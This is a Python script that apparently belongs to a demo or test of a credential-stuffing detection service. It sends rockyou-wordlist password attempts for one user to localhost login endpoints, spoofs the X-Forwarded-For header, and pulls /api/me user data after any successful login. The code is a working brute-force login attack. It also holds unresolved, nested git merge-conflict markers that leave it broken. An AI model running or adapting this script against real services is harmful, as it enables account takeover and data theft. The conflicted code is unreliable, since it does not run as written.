# scripts/stuffing.py

import requests
import random
import itertools
import time
import argparse


# load your creds list (rockyou or hardcoded)
def load_creds(path, limit=None):
    passwords = []
    with open(path, newline="", encoding="latin-1") as f:
        for i, line in enumerate(f):
            passwords.append(line.strip())
            if limit and i + 1 >= limit:
                break
    return passwords

passwords = load_creds("scripts/data/rockyou.txt", limit=5000)
pool = itertools.cycle(passwords)

# store the first successful /api/me response
first_user_info = None


def attack(rate_per_sec=10, attempts=50, use_jwt=False):
<<<<<<< codex/improve-stuffing.py-to-track-attempts-and-duration
    """Send repeated login attempts and report detection results.

    The function now also tracks how many attempts it took for the first
    successful login and how much time elapsed until that success.  This
    helps demonstrate how quickly a credential stuffing attack can succeed
    (or fail) when JWT protection is in place.
    """
=======
    """Send repeated login attempts and report detection results."""
    global first_user_info
<<<<<<< t4vnm3-codex/improve-stuffing.py-to-track-attempts-and-duration
>>>>>>> main
=======
>>>>>>> main
    success = 0
    blocked = 0
    first_success_attempt = None
    first_success_time = None
    first_user_info = None
    start = time.time()

    for i in range(1, attempts + 1):
        pwd = next(pool)
        ip = "10.0.0.1"
        user = "alice"

        token = None
        if use_jwt:
            login_resp = requests.post(
                "http://localhost:8001/api/token",
                data={"username": user, "password": pwd},
                timeout=3,
            )
            token = (
                login_resp.json().get("access_token")
                if login_resp.status_code == 200
                else None
            )
            login_ok = login_resp.status_code == 200
            if token:
                requests.get(
                    "http://localhost:8001/api/alerts",
                    headers={"Authorization": f"Bearer {token}"},
                    timeout=3,
                )
        else:
            login_resp = requests.post(
                "http://localhost:8080/login",
                json={"username": user, "password": pwd},
                headers={"X-Forwarded-For": ip},
                timeout=3,
            )
            login_ok = login_resp.status_code == 200
            if login_ok:
                token = login_resp.json().get("access_token")

        score_payload = {
            "client_ip": ip,
            "auth_result": "success" if login_ok else "failure",
            "with_jwt": bool(token),
        }

        try:
            score_resp = requests.post(
                "http://localhost:8001/score",
                json=score_payload,
                timeout=3,
            )
            if score_resp.json().get("status") == "blocked":
                blocked += 1
        except Exception as e:
            print("SCORE ERROR:", e)

        if login_ok:
            success += 1
            if token:
                try:
<<<<<<< t4vnm3-codex/improve-stuffing.py-to-track-attempts-and-duration
<<<<<<< codex/improve-stuffing.py-to-track-attempts-and-duration
                    info_resp = requests.get(
=======
                    resp = requests.get(
>>>>>>> main
=======
                    resp = requests.get(
>>>>>>> main
                        "http://localhost:8001/api/me",
                        headers={"Authorization": f"Bearer {token}"},
                        timeout=3,
                    )
<<<<<<< t4vnm3-codex/improve-stuffing.py-to-track-attempts-and-duration
<<<<<<< codex/improve-stuffing.py-to-track-attempts-and-duration
                    if info_resp.status_code == 200:
                        data = info_resp.json()
                        first_user_info = first_user_info or data
                        print(f"Retrieved user data: {data}")
                except Exception as e:
                    print("INFO ERROR:", e)
            if first_success_attempt is None:
                first_success_attempt = i
                first_success_time = time.time() - start
=======
=======
>>>>>>> main
                    data = resp.json()
                    if first_user_info is None:
                        first_user_info = data
                        print(f"Retrieved user data: {data}")
                except Exception as e:
                    print("USER INFO ERROR:", e)
<<<<<<< t4vnm3-codex/improve-stuffing.py-to-track-attempts-and-duration
>>>>>>> main
=======
>>>>>>> main

        time.sleep(1 / rate_per_sec)

    total_time = time.time() - start
    print(f"Attempts: {attempts}, successes: {success}, blocked: {blocked}")
    if first_success_attempt:
        print(
            f"First success after {first_success_attempt} attempts "
            f"({first_success_time:.2f}s)"
        )
    print(f"Total elapsed time: {total_time:.2f}s")
    if first_user_info:
        print(f"First user data: {first_user_info}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--jwt", action="store_true", help="Use JWT login endpoint")
    parser.add_argument("--rate", type=float, default=5, help="Attempts per second")
    parser.add_argument("--attempts", type=int, default=50, help="Number of attempts to send")
    args = parser.parse_args()
    attack(rate_per_sec=args.rate, attempts=args.attempts, use_jwt=args.jwt)
